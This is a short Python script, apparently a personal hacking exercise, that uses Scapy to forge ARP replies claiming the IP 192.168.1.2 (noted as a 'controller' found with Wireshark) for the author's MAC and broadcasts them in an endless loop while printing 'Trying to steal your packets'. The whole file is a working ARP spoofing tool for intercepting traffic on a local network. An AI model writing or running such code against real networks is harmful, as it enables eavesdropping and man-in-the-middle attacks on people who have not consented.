from scapy.all import*

myMACAdd= "50:2b:73:e0:5d:50"
#spoofIP=input("Input IP ADRESS to spoof")
spoofIP="192.168.1.2" # after running wireshark --> that was the controller connected ip 

# psrc --> soure Ip feild hwsrc --> ARPsourceMACfeild
arpspoof=ARP(psrc=spoofIP, hwsrc=myMACAdd) # creating my 
boradcast= Ether(dst="ff:ff:ff:ff:ff:ff")

pkt= boradcast/arpspoof # concatenate packet
while True:
	try:
		print("Trying to steal your packets")
		send(pkt)
	except KeyboardInterrupt:
		raise